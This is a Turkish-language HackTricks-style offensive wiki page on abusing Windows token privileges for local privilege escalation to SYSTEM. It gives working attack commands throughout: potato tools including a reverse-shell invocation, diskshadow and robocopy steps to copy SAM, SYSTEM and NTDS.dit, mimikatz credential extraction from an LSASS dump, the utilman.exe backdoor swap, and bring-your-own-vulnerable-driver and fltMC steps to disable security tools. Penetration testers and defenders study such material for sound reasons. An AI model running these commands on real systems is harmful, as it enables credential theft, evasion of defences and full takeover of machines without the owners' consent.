# Token'ları Abuse Etme

{{#include ../../banners/hacktricks-training.md}}

## Token'lar

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız**, devam etmeden önce bu sayfayı okuyun:


{{#ref}}
access-tokens.md
{{#endref}}

**Zaten sahip olduğunuz token'ları abuse ederek privilege escalation gerçekleştirebilirsiniz.**

### SeImpersonatePrivilege

Bu privilege, bir process'in bir token'a handle elde edebildiğinde bu token'ı taklit etmesine (ancak oluşturamamasına) olanak tanır. Privileged bir token, bir Windows service'i (DCOM) bir exploit'e karşı NTLM authentication gerçekleştirmeye zorlayarak elde edilebilir; bu sayede SYSTEM privileges ile bir process çalıştırılabilir.<sup>[[2]](#references)</sup> Bu primitive, [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (WinRM'nin devre dışı olmasını gerektirir), [SweetPotato](https://github.com/CCob/SweetPotato) ve [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) gibi tool'lar kullanılarak exploit edilebilir.

Modern operator notları:

- **JuicyPotato legacy'dir**: Windows 10 1809+/Server 2019+ üzerinde, hangi RPC/COM surface'inin hâlâ erişilebilir olduğuna bağlı olarak **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** veya **PrintSpoofer** kullanmayı tercih edin.
- **`LOCAL SERVICE`** veya **`NETWORK SERVICE`** olarak çalışan bir service'i compromise ettiyseniz ve `whoami /priv` çıktısı `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` olmadan **filtered token** gösteriyorsa, potato family'yi daha sonra yeniden denemeden önce account'un **default privilege set**'ini geri kazanın (örneğin **FullPowers** ile).<sup>[[3]](#references)</sup>
- Bazı yeni fork'lar, original tool'lara göre operator'lar için daha kullanışlıdır. Örneğin **SigmaPotato**, reflection/in-memory execution ve modern Windows compatibility eklerken, **PrintNotifyPotato** PrintNotify COM service'ini abuse eder ve classic Spooler path'i devre dışı bırakıldığında genellikle kullanışlıdır.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**'e çok benzer; ayrıcalıklı bir token elde etmek için **aynı yöntemi** kullanır.\
Ardından bu ayrıcalık, yeni/askıya alınmış bir sürece **birincil token atamaya** olanak tanır. Ayrıcalıklı impersonation token ile birincil token türetebilirsiniz (DuplicateTokenEx).\
Bu token ile 'CreateProcessAsUser' kullanarak **yeni bir süreç** oluşturabilir veya bir süreci askıya alınmış olarak oluşturup **token'ı ayarlayabilirsiniz** (genel olarak, çalışan bir sürecin birincil token'ını değiştiremezsiniz).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Bu token'ı etkinleştirdiyseniz, kimlik bilgilerini bilmeden başka herhangi bir kullanıcı için **KERB_S4U_LOGON** kullanarak bir **impersonation token** elde edebilir, token'a **keyfi bir grup** (admins) ekleyebilir, token'ın **bütünlük düzeyini** "**medium**" olarak ayarlayabilir ve bu token'ı **mevcut thread'e** atayabilirsiniz (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Bu ayrıcalık sayesinde sistem, herhangi bir dosya için (okuma işlemleriyle sınırlı olmak üzere) **tüm okuma erişimi** denetimini verir. Yerel **Administrator** hesaplarının registry'deki **password hash**'lerini **okumak** için kullanılır; ardından "**psexec**" veya "**wmiexec**" gibi araçlar hash ile kullanılabilir (Pass-the-Hash tekniği). Ancak bu teknik iki durumda başarısız olur: Local Administrator hesabı devre dışı bırakıldığında veya uzaktan bağlanan Local Administrators hesaplarının yönetici haklarını kaldıran bir policy mevcut olduğunda.<sup>[[2]](#references)</sup>\
Pratikte en güvenilir yerleşik workflow genellikle **VSS + `robocopy /b`** kullanmaktır: bir shadow copy oluşturup kullanıma açın, ardından dosya ACL'lerini aşan **backup mode** ile `SAM`/`SYSTEM` veya `NTDS.dit` dosyasını kopyalayın.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Bu **privilege**'ı şunlarla **abuse** edebilirsiniz:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) adresinde **IppSec**'i takip ederek
- Veya aşağıdaki **Backup Operators ile privilege escalation** bölümünde açıklandığı şekilde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Bu privilege, dosyanın Access Control List'i (ACL) ne olursa olsun herhangi bir sistem dosyasına **write access** sağlar. **services**'i **modify** etme, DLL Hijacking gerçekleştirme ve diğer çeşitli tekniklerin yanı sıra Image File Execution Options aracılığıyla **debuggers** ayarlama olanağı da dahil olmak üzere privilege escalation için çok sayıda imkan sunar.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege, özellikle bir kullanıcının token'ları impersonate etme yeteneğine sahip olduğu durumlarda güçlü bir permission'dır; ancak SeImpersonatePrivilege mevcut olmadığında da kullanılabilir. Bu yetenek, aynı kullanıcıyı temsil eden ve integrity level'ı mevcut process'in integrity level'ını aşmayan bir token'ı impersonate etme becerisine dayanır.<sup>[[2]](#references)</sup>

**Key Points:**

- **SeImpersonatePrivilege olmadan impersonation:** Belirli koşullar altında token'ları impersonate ederek EoP için SeCreateTokenPrivilege'dan yararlanmak mümkündür.
- **Token impersonation için koşullar:** Başarılı bir impersonation için hedef token'ın aynı kullanıcıya ait olması ve integrity level'ının impersonation gerçekleştiren process'in integrity level'ına eşit veya daha düşük olması gerekir.
- **Impersonation token'larının oluşturulması ve değiştirilmesi:** Kullanıcılar bir impersonation token'ı oluşturabilir ve buna privileged bir grubun SID'sini (Security Identifier) ekleyerek token'ı güçlendirebilir.

### SeLoadDriverPrivilege

Bu privilege, belirli `ImagePath` ve `Type` değerlerine sahip bir registry entry oluşturarak bir process'in **device driver'larını load ve unload etmesine** olanak tanır. `HKLM`'e (HKEY_LOCAL_MACHINE) doğrudan write access kısıtlı olduğundan bunun yerine `HKCU` (HKEY_CURRENT_USER) kullanılabilir. Ancak `HKCU` entry'sinin kernel tarafından bir driver configuration olarak tanınması için belirli bir path gereklidir.<sup>[[2]](#references)</sup>

Modern offensive kullanım genellikle **BYOVD**'dir (bring your own vulnerable driver): **signed ancak vulnerable** bir kernel driver'ı load edin ve ardından protection'ları disable etmek veya kernel code execution'a geçmek için driver'ın IOCTL'lerini kullanın. Güncel Windows 11/Server build'lerinde **Microsoft vulnerable driver blocklist** ve/veya **HVCI/Memory Integrity**'nin eski public chain'lerini sıklıkla bozduğunu unutmayın; bu nedenle klasik `szkg64.sys` tarzı örnekler artık evrensel olarak güvenilir değildir.

Bu path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` şeklindedir; burada `<RID>`, mevcut kullanıcının Relative Identifier'ıdır. `HKCU` içinde bu path'in tamamı oluşturulmalı ve iki value ayarlanmalıdır:<sup>[[2]](#references)</sup>

- `ImagePath`; çalıştırılacak binary'nin path'idir
- `Type`; `SERVICE_KERNEL_DRIVER` (`0x00000001`) değerine sahip olmalıdır.

**İzlenecek Adımlar:**

1. Write access kısıtlı olduğundan `HKLM` yerine `HKCU`'ya erişin.
2. `<RID>` mevcut kullanıcının Relative Identifier'ını temsil edecek şekilde `HKCU` içinde `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` path'ini oluşturun.
3. `ImagePath`'i binary'nin execution path'ine ayarlayın.
4. `Type` değerini `SERVICE_KERNEL_DRIVER` (`0x00000001`) olarak atayın.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Bu ayrıcalığı kötüye kullanmanın daha fazla yolu: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Bu, **SeRestorePrivilege** ile benzerdir. Temel işlevi, WRITE_OWNER erişim hakları sağlayarak açık discretionary access gereksinimini atlayıp bir process'in **bir nesnenin sahipliğini üstlenmesine** olanak tanır. Süreç, öncelikle yazma amacıyla hedef registry key'in sahipliğini ele geçirmeyi, ardından write işlemlerini etkinleştirmek için DACL'yi değiştirmeyi içerir.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Bu ayrıcalık, **diğer süreçlerde hata ayıklamaya** ve belleklerini okumaya ve yazmaya olanak tanır. Çoğu antivirus ve host intrusion prevention çözümünden kaçabilen çeşitli bellek injection stratejileri bu ayrıcalıkla kullanılabilir.<sup>[[2]](#references)</sup>

Modern Windows sistemlerinde `SeDebugPrivilege` ayrıcalığının genellikle **korunmayan SYSTEM süreçlerini** açmak ve token'larını kopyalamak için yeterli olduğunu, ancak bunun **LSASS** üzerinde işlem yapabileceğinizin garantisi olmadığını unutmayın. **RunAsPPL / LSA Protection** etkinse, `SeDebugPrivilege` mevcut olsa bile korunmayan süreçler LSASS'ı okuyamaz veya LSASS'a injection yapamaz. Bu durumda başka bir PPL olmayan SYSTEM sürecinden token çalın veya `procdump`'ın çalışacağını varsaymak yerine bir PPL bypass/BYOVD ile zincir oluşturun. `SeDebugPrivilege` + `SeImpersonatePrivilege` kullanarak token kopyalamaya ilişkin tam bir örnek için [bu sayfaya](sedebug-+-seimpersonate-copy-token.md) bakın.

#### Dump memory

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) içindeki [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aracını kullanarak bir **sürecin belleğini yakalayabilirsiniz**. Özellikle bu işlem, bir kullanıcı sisteme başarıyla giriş yaptıktan sonra kullanıcı kimlik bilgilerini depolamaktan sorumlu olan **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** sürecine uygulanabilir.

Daha sonra parolaları elde etmek için bu dump'ı mimikatz'e yükleyebilirsiniz:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

`NT SYSTEM` shell'i elde etmek istiyorsanız şunları kullanabilirsiniz:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Bu hak (Perform volume maintenance tasks), doğrudan disk G/Ç işlemleri için ham birim cihazı tanıtıcılarının (ör. \\.\C:) açılmasına ve NTFS ACL'lerinin atlanmasına olanak tanır. Bununla, temel blokları okuyarak birimdeki herhangi bir dosyanın baytlarını kopyalayabilir ve hassas materyallerin (ör. %ProgramData%\Microsoft\Crypto\ içindeki makine özel anahtarları, kayıt defteri hive'ları, VSS aracılığıyla SAM/NTDS) keyfi dosya okumasını sağlayabilirsiniz.<sup>[[5]](#references)</sup> Bu durum, CA sunucularında özellikle etkilidir; CA özel anahtarının dışarı çıkarılması, herhangi bir principal'ı taklit etmek için Golden Certificate oluşturulmasını sağlar.<sup>[[6]](#references)</sup>

Ayrıntılı teknikler ve azaltıcı önlemler için:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Ayrıcalıkları kontrol et
```
whoami /priv
```
**Disabled** olarak görünen **token**'lar genellikle etkinleştirilebilir; bu nedenle hem _Enabled_ hem de _Disabled_ ayrıcalıklarını kötüye kullanabilirsiniz.

### Tüm token'ları etkinleştirin

Devre dışı bırakılmış ayrıcalıklara sahipseniz, tüm token'ları etkinleştirmek için [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) script'ini kullanabilirsiniz:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Or bu [**gönderiye**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) gömülü **script**.

## Tablo

[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin) adresinde tam token privileges cheatsheet'i bulunur; aşağıdaki özet yalnızca admin session elde etmek veya hassas dosyaları okumak için privilege'i exploit etmenin doğrudan yollarını listeler.<sup>[[1]](#references)</sup>

| Privilege                  | Etki      | Tool                    | Çalıştırma yolu                                                                                                                                                                                                                                                                                                                                     | Açıklamalar                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Bir kullanıcının token'ları impersonate etmesine ve potato.exe, rottenpotato.exe ve juicypotato.exe gibi tool'lar kullanarak nt system'e privesc yapmasına olanak tanır"_                                                                                                                                                                                                      | Güncelleme için [Aurélien Chalot](https://twitter.com/Defte_) teşekkürler. Yakında bunu daha recipe-like bir biçimde yeniden ifade etmeye çalışacağım.                                                                                                                                                                                         |
| **`SeBackup`**             | **Tehdit**  | _**Built-in commands**_ | `robocopy /b` veya SeBackup-aware özel copy helper'ları ile hassas dosyaları okuyun.                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` ve bazen `%WINDIR%\MEMORY.DMP` için idealdir.<br><br>- `robocopy` kullanışlıdır, ancak özel SeBackup cmdlet/API'leri kilitli/açık dosyalar için genellikle daha esnektir.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | `NtCreateToken` ile local admin haklarını içeren arbitrary token oluşturun.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | **non-PPL** bir SYSTEM token'ını duplicate edin veya korumasız bir process'in memory'sini dump edin.                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection etkinse LSASS dumping genellikle engellenir.</p><p>Script şu adreste bulunabilir: [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | SYSTEM spawn etmek için **Potato family** / named-pipe impersonation kullanın (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` vb.).                                                                                                                                                                                    | <p>IIS APPPOOL, MSSQL, scheduled task'lar veya zaten `SeImpersonatePrivilege` sahibi olan herhangi bir context gibi service account'larında en pratiktir.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. İmzalı ancak vulnerable bir kernel driver (BYOVD) yükleyin<br>2. Kernel R/W elde etmek, security tooling'i devre dışı bırakmak veya SYSTEM'e elevate olmak için driver'ın IOCTL'lerini kullanın<br><br>Alternatif olarak privilege, security ile ilgili driver'ları <code>fltMC</code> builtin command ile unload etmek için kullanılabilir; örneğin <code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> gibi daha eski public driver'lar, vulnerable-driver blocklist / HVCI tarafından modern Windows'ta giderek daha fazla engellenmektedir.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. SeRestore privilege mevcut olacak şekilde PowerShell/ISE başlatın.<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> ile privilege'i enable edin.<br>3. utilman.exe dosyasını utilman.old olarak yeniden adlandırın<br>4. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>5. Console'u lock edin ve Win+U tuşlarına basın</p> | <p>Attack bazı AV software'leri tarafından tespit edilebilir.</p><p>Alternative method, aynı privilege'i kullanarak "Program Files" içinde bulunan service binary'lerini replace etmeye dayanır</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe dosyasını utilman.exe olarak yeniden adlandırın<br>4. Console'u lock edin ve Win+U tuşlarına basın</p>                                                                                                                                       | <p>Attack bazı AV software'leri tarafından tespit edilebilir.</p><p>Alternative method, aynı privilege'i kullanarak "Program Files" içinde bulunan service binary'lerini replace etmeye dayanır.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Token'ları local admin haklarını içerecek şekilde manipulate edin. SeImpersonate gerekebilir.</p><p>Doğrulanması gerekiyor.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows privilege'lerinden admin'e exploitation path'leri](https://github.com/gtworek/Priv2Admin)
- [2] [LPE için Token Privilege'lerini Abuse Etme](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privilege'lerimi Geri Verin! Lütfen?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` backup mode, file/folder ACL kontrollerini bypass eder)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Volume maintenance task'larını gerçekleştirme (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
